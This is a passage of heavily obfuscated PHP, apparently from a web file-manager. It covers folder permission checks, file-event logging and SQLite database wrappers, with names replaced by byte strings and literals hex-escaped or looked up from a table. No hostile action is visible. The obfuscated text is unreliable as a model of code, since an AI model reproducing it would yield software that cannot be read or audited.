$ÀÍŞçµ; } private function authFolderOwnerUser($ã£»¾§) { $‘‹ ñÊ =& $_SERVER[ìïæ“œî]; $ô¤Ø¢÷¥ = array(); $øüŠ—ØØ = !1; foreach ($ã£»¾§ as $¬©Ó§) { $Ì¢µšÜæ = $this->authInfo($¬©Ó§); if ($¬©Ó§[$‘‹ ñÊ[569]] == $‘‹ ñÊ[228]) { $øüŠ—ØØ = !0; } if ($¬©Ó§[$‘‹ ñÊ[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ì¢µšÜæ[$‘‹ ñÊ[487]])) { $ô¤Ø¢÷¥[] = $¬©Ó§[$‘‹ ñÊ[569]]; } } } return array($‘‹ ñÊ[662] => $ô¤Ø¢÷¥, $‘‹ ñÊ[2161] => $øüŠ—ØØ); } public function authMake($¾ñêÅúè, $³Ê…ÉÅÕ = false) { $É’Ñ‡÷ =& $_SERVER[ìïæ“œî]; $‚Æ„İÎ = $this->authArrayCheck($¾ñêÅúè, $³Ê…ÉÅÕ); if ($‚Æ„İÎ[$É’Ñ‡÷[2163]]) { $‚Æ„İÎ[$É’Ñ‡÷[2163]] = $this->sourceAuthInfo($‚Æ„İÎ[$É’Ñ‡÷[2163]]); } return $‚Æ„İÎ; } public function authArrayCheck($±Õ—ä³©, $ô±¬®‚Î = false) { $»·ªÒû« =& $_SERVER[ìïæ“œî]; if (!$±Õ—ä³©) { return array($»·ªÒû«[488] => 0, $»·ªÒû«[540] => !1); } $ô±¬®‚Î = $ô±¬®‚Î ? $ô±¬®‚Î : USER_ID; $ÎÔÄæåû = 0; $×ÎØÂŸ = 0; $æğ¸…«  = 0; $¾‚½¿‰ï = 0; $ÜĞóş©× = 0; $ôöğ¿÷ = 0; $£šúêå­ = 1000; $ÜÉ¥Øˆ÷ = 0; $©èÏ­Ù‰ = 0; $Ó¼°êº = 0; $´È—îÚ§ = 0; $ìÎÕæá = array($»·ªÒû«[193] => 0); foreach ($±Õ—ä³© as $ìÎÕæá) { $µÓ‰ÙÂà = $this->authInfo($ìÎÕæá); if (!$µÓ‰ÙÂà) { continue; } $‡·¨®ä½ = $ìÎÕæá[$»·ªÒû«[569]]; $ÔÆ¬ª¼œ = intval($µÓ‰ÙÂà[$»·ªÒû«[487]]); if ($ìÎÕæá[$»·ªÒû«[190]] == SourceModel::TYPE_USER && $‡·¨®ä½ == $ô±¬®‚Î) { $ÎÔÄæåû = !0; $æğ¸…«  = $µÓ‰ÙÂà; $×ÎØÂŸ = $ÔÆ¬ª¼œ; } else { if ($ìÎÕæá[$»·ªÒû«[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‡·¨®ä½, $ô±¬®‚Î)) { $¾‚½¿‰ï = !0; $ˆ¤àß¥ó = $this->groupStepToUserGroup($‡·¨®ä½, $ô±¬®‚Î); if ($ˆ¤àß¥ó < $£šúêå­) { $£šúêå­ = $ˆ¤àß¥ó; $ÜĞóş©× = $ÔÆ¬ª¼œ; $ôöğ¿÷ = $µÓ‰ÙÂà; $ÜÉ¥Øˆ÷ = $‡·¨®ä½; } if ($ˆ¤àß¥ó == $£šúêå­ && $ÔÆ¬ª¼œ >= $ÜĞóş©×) { $ÜĞóş©× = $ÔÆ¬ª¼œ; $ôöğ¿÷ = $µÓ‰ÙÂà; $ÜÉ¥Øˆ÷ = $‡·¨®ä½; } } else { if ($‡·¨®ä½ == $»·ªÒû«[228]) { $©èÏ­Ù‰ = !0; $´È—îÚ§ = $µÓ‰ÙÂà; $Ó¼°êº = $ÔÆ¬ª¼œ; } } } } if ($ÎÔÄæåû) { $ÑĞÔ©»ê = $×ÎØÂŸ; $µÓ‰ÙÂà = $æğ¸…« ; $õÁú½Ñ¼ = LNG($»·ªÒû«[2164]); } else { if ($¾‚½¿‰ï) { $ÑĞÔ©»ê = $ÜĞóş©×; $µÓ‰ÙÂà = $ôöğ¿÷; $½ºÏî•è = Model($»·ªÒû«[585])->getInfo($ÜÉ¥Øˆ÷); $õÁú½Ñ¼ = $»·ªÒû«[176] . $½ºÏî•è[$»·ªÒû«[589]] . $»·ªÒû«[2165] . LNG($»·ªÒû«[2166]); } else { if ($©èÏ­Ù‰) { $ÑĞÔ©»ê = $Ó¼°êº; $µÓ‰ÙÂà = $´È—îÚ§; $õÁú½Ñ¼ = LNG($»·ªÒû«[2136]); } else { $ÑĞÔ©»ê = 0; $µÓ‰ÙÂà = !1; $õÁú½Ñ¼ = $»·ªÒû«[12]; } } } $çş‡ÚÙ‡ = array($»·ªÒû«[2156] => intval($ÑĞÔ©»ê), $»·ªÒû«[2139] => $µÓ‰ÙÂà, $»·ªÒû«[2157] => $õÁú½Ñ¼, $»·ªÒû«[2148] => $ìÎÕæá[$»·ªÒû«[193]]); return $çş‡ÚÙ‡; } private function groupContainUser($®¨†¶Ç“, $ó°˜şµİ = false) { return in_array($®¨†¶Ç“, $this->userGroupParents($ó°˜şµİ)); } private function groupStepToUserGroup($‹²Ò‹âã, $Í–ßœÑæ = false) { $ºÄ“ï„ğ =& $_SERVER[ìïæ“œî]; $å´ÏÇ‰Ÿ = $this->userGroupList($Í–ßœÑæ); $í£¤¥¸ª = 1000; $¾¢ØŠ¶— = $GLOBALS[$ºÄ“ï„ğ[6]][$ºÄ“ï„ğ[92]][$ºÄ“ï„ğ[2053]] == 1; $Ó¯’¸–Û = $¾¢ØŠ¶— ? 3 : 2; foreach ($å´ÏÇ‰Ÿ as $Í¥ğî—µ) { if ($Í¥ğî—µ[$ºÄ“ï„ğ[1946]] == $‹²Ò‹âã) { return 0; } $¾Óö’½Ø = explode($ºÄ“ï„ğ[50], trim($Í¥ğî—µ[$ºÄ“ï„ğ[584]], $ºÄ“ï„ğ[50])); if ($¾Óö’½Ø[0] == $ºÄ“ï„ğ[228] && count($¾Óö’½Ø) > $Ó¯’¸–Û) { $ŒÚóÊó– = array_reverse(array_slice($¾Óö’½Ø, $Ó¯’¸–Û)); $Œ´Üü¾ñ = array_search($‹²Ò‹âã, $ŒÚóÊó–); if ($Œ´Üü¾ñ !== !1 && $Œ´Üü¾ñ + 1 <= $í£¤¥¸ª) { $í£¤¥¸ª = $Œ´Üü¾ñ + 1; } } } return $í£¤¥¸ª; } private function userGroupList($”¹¾¨Öğ = false) { $‹—¤õ™ì =& $_SERVER[ìïæ“œî]; static $à°‡ê¢ = array(); if (isset($à°‡ê¢[$”¹¾¨Öğ])) { return $à°‡ê¢[$”¹¾¨Öğ]; } $ı·±áç¸ = Model($‹—¤õ™ì[598])->getInfo($”¹¾¨Öğ); $à°‡ê¢[$”¹¾¨Öğ] = array_to_keyvalue($ı·±áç¸[$‹—¤õ™ì[2137]], $‹—¤õ™ì[1946]); return $à°‡ê¢[$”¹¾¨Öğ]; } public function userGroupParents($öÆÇ‚ï ) { $çù…ŒÄ  =& $_SERVER[ìïæ“œî]; static $£“æåøÆ = array(); $öÆÇ‚ï  = $öÆÇ‚ï  ? $öÆÇ‚ï  : USER_ID; if (isset($£“æåøÆ[$öÆÇ‚ï ])) { return $£“æåøÆ[$öÆÇ‚ï ]; } $Ú›ô™—Ò = $this->userGroupList($öÆÇ‚ï ); $°°½´¾Ü = array(); $¶€’ĞçŞ = $GLOBALS[$çù…ŒÄ [6]][$çù…ŒÄ [92]][$çù…ŒÄ [2053]] == 1; $ÂŸîŸ°‹ = $¶€’ĞçŞ ? 3 : 2; foreach ($Ú›ô™—Ò as $¹æˆ¿Ä) { $¢Ó¤ã… = array($¹æˆ¿Ä[$çù…ŒÄ [1946]]); $Ó„Û„…ß = explode($çù…ŒÄ [50], trim($¹æˆ¿Ä[$çù…ŒÄ [584]], $çù…ŒÄ [50])); if ($Ó„Û„…ß[0] == $çù…ŒÄ [228] && count($Ó„Û„…ß) > $ÂŸîŸ°‹) { $ØúúÒ› = array_slice($Ó„Û„…ß, $ÂŸîŸ°‹); $¢Ó¤ã… = array_merge($¢Ó¤ã…, array_reverse($ØúúÒ›)); } $°°½´¾Ü = array_merge($°°½´¾Ü, $¢Ó¤ã…); } $£“æåøÆ[$öÆÇ‚ï ] = array_unique($°°½´¾Ü); return $£“æåøÆ[$öÆÇ‚ï ]; } public function authTargetInfoMake($È©ÄÎ‘É) { $òÁ¾Æ§Ç =& $_SERVER[ìïæ“œî]; $íò‚Åş = array(); $¸´ÑÄúÄ = array(); foreach ($È©ÄÎ‘É as $§û€¦‰) { if ($§û€¦‰[$òÁ¾Æ§Ç[190]] == SourceModel::TYPE_USER) { $íò‚Åş[] = intval($§û€¦‰[$òÁ¾Æ§Ç[569]]); } else { if ($§û€¦‰[$òÁ¾Æ§Ç[190]] == SourceModel::TYPE_GROUP) { $¸´ÑÄúÄ[] = intval($§û€¦‰[$òÁ¾Æ§Ç[569]]); } } } if ($íò‚Åş) { $íò‚Åş = Model($òÁ¾Æ§Ç[577])->userListInfo($íò‚Åş); } if ($¸´ÑÄúÄ) { $ş²²Èó = array($òÁ¾Æ§Ç[2038] => array($òÁ¾Æ§Ç[492], $¸´ÑÄúÄ)); $¸´ÑÄúÄ = Model($òÁ¾Æ§Ç[585])->field($òÁ¾Æ§Ç[2167])->where($ş²²Èó)->select(); $¸´ÑÄúÄ = array_to_keyvalue($¸´ÑÄúÄ, $òÁ¾Æ§Ç[1946]); } return array($òÁ¾Æ§Ç[2168] => $íò‚Åş, $òÁ¾Æ§Ç[2169] => $¸´ÑÄúÄ); } public function authInfo($ªÄ„‘ä¥) { $ëòÜÑîé =& $_SERVER[ìïæ“œî]; if ($ªÄ„‘ä¥[$ëòÜÑîé[2054]]) { $ı£³í™à = Model($ëòÜÑîé[571])->listData($ªÄ„‘ä¥[$ëòÜÑîé[2054]]); if (!$ı£³í™à) { return !1; $–»•¦¢ = Model($ëòÜÑîé[571])->listData(); $°ÒêİÃ³ = array_filter_by_field($–»•¦¢, $ëòÜÑîé[487], $ëòÜÑîé[228]); return $°ÒêİÃ³; } $¹Œà»‚Í = array_field_key($ı£³í™à, array($ëòÜÑîé[475], $ëòÜÑîé[32], $ëòÜÑîé[487], $ëòÜÑîé[1969], $ëòÜÑîé[1970])); $¹Œà»‚Í[$ëòÜÑîé[2170]] = $ªÄ„‘ä¥; return $¹Œà»‚Í; } else { return array($ëòÜÑîé[493] => 0, $ëòÜÑîé[1952] => $ªÄ„‘ä¥[$ëòÜÑîé[2114]], $ëòÜÑîé[494] => $ëòÜÑîé[12], $ëòÜÑîé[1969] => $ëòÜÑîé[2171]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\x63\x65\137\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\x6d\x65", "\164\151\155\145", "\151\156\163\x65\162\164", "\146\165\x6e\x63\x74\x69\x6f\x6e"), array("\x64\x65\163\143", '', "\x69\x6e\163\x65\x72\164\x2c\x75\x70\144\x61\x74\x65\x2c\x73\145\154\x65\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¶÷™æ‹, $—Ğñ„Îç, $À¯øˆ‚ı = '') { $ÙâÍÍÃ© =& $_SERVER[ìïæ“œî]; if (!$this->eventSave) { return; } $áœìÆÅ = Model($ÙâÍÍÃ©[1394])->sourceInfo($¶÷™æ‹); if (!$áœìÆÅ) { return !1; } if ($this->isDisableEvent($áœìÆÅ, $—Ğñ„Îç)) { return; } if ($À¯øˆ‚ı && is_string($À¯øˆ‚ı)) { $À¯øˆ‚ı = array($ÙâÍÍÃ©[1985] => $À¯øˆ‚ı); } $º©˜ïÄÁ = defined($ÙâÍÍÃ©[2172]) ? USER_ID : 0; $êºêÙÎ§ = array($ÙâÍÍÃ©[491] => $¶÷™æ‹, $ÙâÍÍÃ©[2173] => $áœìÆÅ[$ÙâÍÍÃ©[192]], $ÙâÍÍÃ©[2174] => $áœìÆÅ[$ÙâÍÍÃ©[32]], $ÙâÍÍÃ©[582] => !empty($áœìÆÅ[$ÙâÍÍÃ©[582]]) ? $áœìÆÅ[$ÙâÍÍÃ©[582]] : $ÙâÍÍÃ©[12], $ÙâÍÍÃ©[1738] => $º©˜ïÄÁ, $ÙâÍÍÃ©[496] => $—Ğñ„Îç, $ÙâÍÍÃ©[1740] => $À¯øˆ‚ı); $this->addSystemLog($—Ğñ„Îç, $êºêÙÎ§); unset($êºêÙÎ§[$ÙâÍÍÃ©[2174]], $êºêÙÎ§[$ÙâÍÍÃ©[582]]); return $this->add($êºêÙÎ§); } private function addSystemLog($éĞÊ¬ô®, $úø‚Ô³) { $åİ¡šÆ” =& $_SERVER[ìïæ“œî]; if ($éĞÊ¬ô® == $åİ¡šÆ”[2175]) { $éĞÊ¬ô® = $úø‚Ô³[$åİ¡šÆ”[526]][$åİ¡šÆ”[2176]]; } else { if (in_array($éĞÊ¬ô®, array($åİ¡šÆ”[1925], $åİ¡šÆ”[2177]))) { $éĞÊ¬ô® = $úø‚Ô³[$åİ¡šÆ”[526]][$åİ¡šÆ”[171]]; } } $ô·—‰ı = array_merge($úø‚Ô³, array($åİ¡šÆ”[2178] => $úø‚Ô³[$åİ¡šÆ”[193]], $åİ¡šÆ”[2179] => $úø‚Ô³[$åİ¡šÆ”[2179]])); Hook::trigger($åİ¡šÆ”[2180], $åİ¡šÆ”[2181] . $éĞÊ¬ô®, $úø‚Ô³); Model($åİ¡šÆ”[1889])->addLog($åİ¡šÆ”[2181] . $éĞÊ¬ô®, $ô·—‰ı); } private function isDisableEvent($¿†ëÚéš, $’Úı¡¡ã) { $¹ÚÒÀ’  =& $_SERVER[ìïæ“œî]; if ($¿†ëÚéš[$¹ÚÒÀ’ [190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($’Úı¡¡ã == $¹ÚÒÀ’ [1914]) { return !1; } return !0; } public function eventCreate($ùŠ¥åõí, $¸ò˜›ï–) { $µÚ†¨ªÖ =& $_SERVER[ìïæ“œî]; $÷ë°Öˆ… = Model($µÚ†¨ªÖ[1394])->sourceInfo($ùŠ¥åõí); $•Ù†»ä = array($µÚ†¨ªÖ[2176] => $¸ò˜›ï–, $µÚ†¨ªÖ[32] => $÷ë°Öˆ…[$µÚ†¨ªÖ[32]]); return $this->addEvent($ùŠ¥åõí, $µÚ†¨ªÖ[2175], $•Ù†»ä); } public function eventFileEdit($£íÛ‹öÇ) { $Êã©†Ÿ€ =& $_SERVER[ìïæ“œî]; $şœÏÆµò = array($Êã©†Ÿ€[2182] => $_SERVER[$Êã©†Ÿ€[2183]], $Êã©†Ÿ€[2184] => strtolower(ACTION)); if (isset($GLOBALS[$Êã©†Ÿ€[7]][$Êã©†Ÿ€[2185]])) { $şœÏÆµò[$Êã©†Ÿ€[2185]] = $Êã©†Ÿ€[91]; } return $this->addEvent($£íÛ‹öÇ, $Êã©†Ÿ€[1915], $şœÏÆµò); } public function eventRecycle($Ë‚İ·¡·, $—Ûôàâ¡) { return $this->addEvent($Ë‚İ·¡·, $_SERVER[ìïæ“œî][2177], $—Ûôàâ¡); } private static $_removeLast = ''; public function eventRemove($™ÈŸ‰À) { $äšÁãüŒ =& $_SERVER[ìïæ“œî]; self::$_removeLast = $™ÈŸ‰À; $´¤Š©ôŠ = Model($äšÁãüŒ[1394])->sourceInfo($™ÈŸ‰À); $î†šà±Á = array_field_key($´¤Š©ôŠ, array($äšÁãüŒ[193], $äšÁãüŒ[541], $äšÁãüŒ[505], $äšÁãüŒ[584])); $İ”Œ£ã = array($äšÁãüŒ[171] => $´¤Š©ôŠ[$äšÁãüŒ[32]], $äšÁãüŒ[2184] => ACTION, $äšÁãüŒ[2186] => $î†šà±Á); return $this->addEvent($´¤Š©ôŠ[$äšÁãüŒ[192]], $äšÁãüŒ[1914], $İ”Œ£ã); } public function eventShare($äŠêßüÏ, $ßé¬ïÙÔ) { return $this->addEvent($äŠêßüÏ, $_SERVER[ìïæ“œî][1925], $ßé¬ïÙÔ); } public function eventMove($’ªªĞš­, $ªØ«£àÅ, $¤¦²ë‘¡) { $ç˜åÕÏ¡ =& $_SERVER[ìïæ“œî]; if (self::$_removeLast == $’ªªĞš­) { return; } $Ë˜ğë„ = Model($ç˜åÕÏ¡[1394]); $ÉœãĞî = $Ë˜ğë„->sourceInfo($’ªªĞš­); $¢”ÇÈá = $Ë˜ğë„->sourceInfo($ªØ«£àÅ); $«ÜÍ¨´½ = $Ë˜ğë„->sourceInfo($¤¦²ë‘¡); $“ÍÇ‹ÅÆ = array($ç˜åÕÏ¡[1218] => $ªØ«£àÅ, $ç˜åÕÏ¡[2187] => $¢”ÇÈá[$ç˜åÕÏ¡[32]], $ç˜åÕÏ¡[2163] => !empty($¢”ÇÈá[$ç˜åÕÏ¡[582]]) ? $¢”ÇÈá[$ç˜åÕÏ¡[582]] : $ç˜åÕÏ¡[12], $ç˜åÕÏ¡[1219] => $¤¦²ë‘¡, $ç˜åÕÏ¡[2188] => $«ÜÍ¨´½[$ç˜åÕÏ¡[32]], $ç˜åÕÏ¡[2189] => !empty($«ÜÍ¨´½[$ç˜åÕÏ¡[582]]) ? $«ÜÍ¨´½[$ç˜åÕÏ¡[582]] : $ç˜åÕÏ¡[12]); $this->addEvent($’ªªĞš­, $ç˜åÕÏ¡[620], $“ÍÇ‹ÅÆ); $ÉœãĞî = $Ë˜ğë„->sourceInfo($’ªªĞš­); $“ÍÇ‹ÅÆ = array($ç˜åÕÏ¡[193] => $ÉœãĞî[$ç˜åÕÏ¡[193]], $ç˜åÕÏ¡[32] => $ÉœãĞî[$ç˜åÕÏ¡[32]]); $this->addEvent($ªØ«£àÅ, $ç˜åÕÏ¡[2190], $“ÍÇ‹ÅÆ); } public function eventCopy($†‡¸òù) { $this->eventCreate($†‡¸òù, $_SERVER[ìïæ“œî][618]); } public function eventRename($ÅÑªƒó, $ó´Îı…Ö, $‡Š¯½±) { $ˆÈ´¦ÜÚ =& $_SERVER[ìïæ“œî]; $˜º˜È”´ = array($ˆÈ´¦ÜÚ[1218] => $ó´Îı…Ö, $ˆÈ´¦ÜÚ[1219] => $‡Š¯½±); return $this->addEvent($ÅÑªƒó, $ˆÈ´¦ÜÚ[1408], $˜º˜È”´); } public function eventAddComment($³ÚëûÄ±, $Êˆ³“) { return $this->addEvent($³ÚëûÄ±, $_SERVER[ìïæ“œî][2191], $Êˆ³“); } public function eventAddDesc($öÔûı…±, $†íüş²Ì) { return $this->addEvent($öÔûı…±, $_SERVER[ìïæ“œî][2192], $†íüş²Ì); } public function listBySource($í§×äù¦) { $ÖŠšôÆö =& $_SERVER[ìïæ“œî]; $ùÌ„ìãô = Model($ÖŠšôÆö[1394])->sourceInfo($í§×äù¦); $»Ûõ‹Ò = array($ÖŠšôÆö[491] => $í§×äù¦); if ($ùÌ„ìãô[$ÖŠšôÆö[485]] == $ÖŠšôÆö[91]) { $âÎï‡÷· = Model($ÖŠšôÆö[1394])->listSearchChildren($í§×äù¦, 20000); $âÎï‡÷·[] = $í§×äù¦ . $ÖŠšôÆö[454]; $»Ûõ‹Ò = array($ÖŠšôÆö[193] => array($ÖŠšôÆö[7], $âÎï‡÷·)); } $Şã½©²ä = $this->where($»Ûõ‹Ò)->order($ÖŠšôÆö[2193])->selectPage(); if ($Şã½©²ä[$ÖŠšôÆö[442]][$ÖŠšôÆö[443]] == 0) { $Şã½©²ä[$ÖŠšôÆö[442]][$ÖŠšôÆö[443]] = 1; $Şã½©²ä[$ÖŠšôÆö[445]] = array(array($ÖŠšôÆö[491] => $í§×äù¦, $ÖŠšôÆö[2173] => $ùÌ„ìãô[$ÖŠšôÆö[192]], $ÖŠšôÆö[1738] => $ùÌ„ìãô[$ÖŠšôÆö[527]], $ÖŠšôÆö[496] => $ÖŠšôÆö[2194], $ÖŠšôÆö[497] => $ùÌ„ìãô[$ÖŠšôÆö[231]], $ÖŠšôÆö[1740] => $ÖŠšôÆö[12])); } return $this->eventListParse($Şã½©²ä, $í§×äù¦); } private function eventListParse($É¨¿ğñ, $Ö¥Í¦ìä) { $“ï¢á¬ =& $_SERVER[ìïæ“œî]; $ŸùÑ˜ş = $É¨¿ğñ[$“ï¢á¬[445]]; $ëÔ©Ô = array_to_keyvalue($ŸùÑ˜ş, $“ï¢á¬[12], $“ï¢á¬[193]); $ñÓ»ì¬à = array_to_keyvalue($ŸùÑ˜ş, $“ï¢á¬[12], $“ï¢á¬[2179]); foreach ($ŸùÑ˜ş as $Ğ§®¾ïˆ) { $òÂ¥ÁÔç = $Ğ§®¾ïˆ[$“ï¢á¬[526]]; if ($Ğ§®¾ïˆ[$“ï¢á¬[33]] == $“ï¢á¬[620] && isset($òÂ¥ÁÔç[$“ï¢á¬[1218]])) { $ëÔ©Ô[] = $òÂ¥ÁÔç[$“ï¢á¬[1218]] . $“ï¢á¬[12]; $ëÔ©Ô[] = $òÂ¥ÁÔç[$“ï¢á¬[1219]] . $“ï¢á¬[12]; } if ($Ğ§®¾ïˆ[$“ï¢á¬[33]] == $“ï¢á¬[2190] && isset($òÂ¥ÁÔç[$“ï¢á¬[193]])) { $ëÔ©Ô[] = $òÂ¥ÁÔç[$“ï¢á¬[193]] . $“ï¢á¬[12]; } } $ëÔ©Ô = array_merge($ëÔ©Ô, $ñÓ»ì¬à, array($Ö¥Í¦ìä . $“ï¢á¬[12])); $ëÔ©Ô = array_unique($ëÔ©Ô); $ë…ø¿ò‚ = array_unique(array_to_keyvalue($ŸùÑ˜ş, $“ï¢á¬[12], $“ï¢á¬[1747])); $©¨À©ÑØ = Model($“ï¢á¬[598])->userListInfo($ë…ø¿ò‚); $Å·„ˆë· = Model($“ï¢á¬[873])->sourceListInfo($ëÔ©Ô, !0); foreach ($ŸùÑ˜ş as &$Ğ§®¾ïˆ) { if ($Ğ§®¾ïˆ[$“ï¢á¬[33]] == $“ï¢á¬[620] && isset($Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[1218]])) { $Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[1218]] = $Å·„ˆë·[$Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[1218]]]; $Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[1219]] = $Å·„ˆë·[$Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[1219]]]; } if ($Ğ§®¾ïˆ[$“ï¢á¬[33]] == $“ï¢á¬[2190] && isset($Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[193]])) { $Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[193]] = $Å·„ˆë·[$Ğ§®¾ïˆ[$“ï¢á¬[526]][$“ï¢á¬[193]]]; } $Ğ§®¾ïˆ[$“ï¢á¬[90]] = $Å·„ˆë·[$Ğ§®¾ïˆ[$“ï¢á¬[193]]]; $Ğ§®¾ïˆ[$“ï¢á¬[2195]] = $Å·„ˆë·[$Ğ§®¾ïˆ[$“ï¢á¬[2179]]]; if ($Ğ§®¾ïˆ[$“ï¢á¬[33]] == $“ï¢á¬[1914]) { $Ğ§®¾ïˆ[$“ï¢á¬[2195]] = $Ğ§®¾ïˆ[$“ï¢á¬[90]]; $Ğ§®¾ïˆ[$“ï¢á¬[2179]] = $Ğ§®¾ïˆ[$“ï¢á¬[2195]][$“ï¢á¬[193]]; $Ğ§®¾ïˆ[$“ï¢á¬[90]] = !1; $Ğ§®¾ïˆ[$“ï¢á¬[193]] = $“ï¢á¬[12]; } $Ğ§®¾ïˆ[$“ï¢á¬[2122]] = $©¨À©ÑØ[$Ğ§®¾ïˆ[$“ï¢á¬[1747]]]; } unset($Ğ§®¾ïˆ); $É¨¿ğñ[$“ï¢á¬[445]] = $ŸùÑ˜ş; return $É¨¿ğñ; } public function removeBySource($õ£­È¨ô) { $µƒª¹ñ¬ = array($_SERVER[ìïæ“œî][491] => $õ£­È¨ô); $this->where($µƒª¹ñ¬)->remove(); } } goto B¯³¯ ˜Ê; bÏŠ¡ŒÛÀÁ: class DbSqlite extends DbSqliteBase { public function query($ßßª„Ğ÷) { $×ÎÅŒĞ² =& $_SERVER[ìïæ“œî]; if (!CacheLock::fileLock($×ÎÅŒĞ²[13])) { return !1; } $òºƒûÊı = parent::query($ßßª„Ğ÷); CacheLock::fileUnLock($×ÎÅŒĞ²[13]); return $òºƒûÊı; } public function execute($ÑÄ€©ê) { $ÎÌúŒğš =& $_SERVER[ìïæ“œî]; if (!CacheLock::fileLock($ÎÌúŒğš[13])) { return !1; } $›‚¯ˆï = parent::execute($ÑÄ€©ê); CacheLock::fileUnLock($ÎÌúŒğš[13]); return $›‚¯ˆï; } } class DbSqlite3 extends DbSqlite3Base { public function query($•¹êÖ›) { $áËûÒİ =& $_SERVER[ìïæ“œî]; if (!CacheLock::fileLock($áËûÒİ[13])) { return !1; } $·Õ¢±öú = parent::query($•¹êÖ›); CacheLock::fileUnLock($áËûÒİ[13]); return $·Õ¢±öú; } public function execute($úÔÖ´¡Ñ) { $£¶í´ÁŞ =& $_SERVER[ìïæ“œî]; if (!CacheLock::fileLock($£¶í´ÁŞ[13])) { return !1; } $­éøä’ = parent::execute($úÔÖ´¡Ñ); CacheLock::fileUnLock($£¶í´ÁŞ[13]); return $­éøä’; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\161" => "\x3c\76", "\147\x74" => "\76", "\145\147\164" => "\x3e\x3d", "\154\164" => "\74", "\x65\x6c\164" => "\x3c\75", "\x6e\x6f\x74\x6c\x69\153\145" => "\x4e\x4f\x54\x20\x4c\111\113\105", "\x6c\151\x6b\145" => "\x4c\111\x4b\105", "\151\x6e" => "\111\116", "\x6e\x6f\x74\151\156" => "\x4e\117\124\x20\x49\x4e", "\156\157\x74\x20\151\156" => "\116\x4f\124\40\x49\116", "\142\145\164\167\x65\x65\156" => "\x42\x45\124\127\105\105\116", "\x6e\157\x74\142\145\164\x77\145\x65\x6e" => "\x4e\117\124\x20\102\105\x54\127\x45\105\116", "\x6e\157\x74\40\x62\145\164\167\x65\145\156" => "\116\117\x54\x20\102\105\124\127\105\105\x4e"); protected $selectSql = "\x53\105\x4c\105\103\124\45\x44\x49\x53\124\x49\x4e\x43\x54\x25\40\x25\106\x49\105\114\x44\x25\40\x46\122\x4f\x4d\x20\x25\x54\x41\x42\x4c\x45\45\x25\x4a\x4f\x49\x4e\x25\45\x57\110\105\122\105\x25\45\107\122\117\125\120\x25\45\x48\x41\x56\x49\x4e\x47\45\x25\117\x52\104\105\x52\x25\45\114\111\115\x49\124\45\x20\45\125\x4e\x49\117\116\45\x25\103\117\x4d\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $¸•ƒ¢ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ìïæ“œî][1015], $¸•ƒ¢); } public function factory($ë™Á„¯ = '') { $â’ıœó =& $_SERVER[ìïæ“œî]; $ë™Á„¯ = $this->parseConfig($ë™Á„¯); if (empty($ë™Á„¯[$â’ıœó[1016]])) { think_exception(think_lang($â’ıœó[1017])); } $this->dbType = ucwords(strtolower($ë™Á„¯[$â’ıœó[1016]])); $ŸõµÄÉ¤ = $â’ıœó[1018] . $this->dbType; if (class_exists($ŸõµÄÉ¤)) { $İø¨úŸ¡ = new $ŸõµÄÉ¤($ë™Á„¯); if ($â’ıœó[1019] != strtolower($ë™Á„¯[$â’ıœó[1016]])) { $İø¨úŸ¡->dbType = strtoupper($this->dbType); } else { $İø¨úŸ¡->dbType = $this->_getDsnType($ë™Á„¯[$â’ıœó[971]]); } } else { think_exception(think_lang($â’ıœó[1020]) . $â’ıœó[1021] . $ŸõµÄÉ¤); } return $İø¨úŸ¡; } public function __call($“¸ë«°ö, $Ê–¶Çœ) { if (method_exists($this, $“¸ë«°ö)) { return call_user_func_array(array($this, $“¸ë«°ö), $Ê–¶Çœ); } } protected function _getDsnType($äÎñó³¯) { $ŞŞ€‚¹Ó = explode($_SERVER[ìïæ“œî][4], $äÎñó³¯); $ÃÌßàæ = strtoupper(trim($ŞŞ€‚¹Ó[0])); return $ÃÌßàæ; } private function parseConfig($´ê„®åİ = '') { $¶¢¯¿ˆî =& $_SERVER[ìïæ“œî]; if (!empty($´ê„®åİ) && is_string($´ê„®åİ)) { $´ê„®åİ = $this->parseDSN($´ê„®åİ); } elseif (is_array($´ê„®åİ)) { $´ê„®åİ = array_change_key_case($´ê„®åİ); $´ê„®åİ = array($¶¢¯¿ˆî[1016] => $´ê„®åİ[$¶¢¯¿ˆî[1022]], $¶¢¯¿ˆî[943] => $´ê„®åİ[$¶¢¯¿ˆî[1023]], $¶¢¯¿ˆî[944] => $´ê„®åİ[$¶¢¯¿ˆî[1024]], $¶¢¯¿ˆî[941] => $´ê„®åİ[$¶¢¯¿ˆî[1025]], $¶¢¯¿ˆî[942] => $´ê„®åİ[$¶¢¯¿ˆî[1026]], $¶¢¯¿ˆî[21] => $´ê„®åİ[$¶¢¯¿ˆî[1027]], $¶¢¯¿ˆî[971] => $´ê„®åİ[$¶¢¯¿ˆî[1028]], $¶¢¯¿ˆî[17] => isset($´ê„®åİ[$¶¢¯¿ˆî[1029]]) ? $´ê„®åİ[$¶¢¯¿ˆî[1029]] : array()); } elseif (empty($´ê„®åİ)) { if (think_config($¶¢¯¿ˆî[1030]) && $¶¢¯¿ˆî[1019] != strtolower(think_config($¶¢¯¿ˆî[1031]))) { $´ê„®åİ = 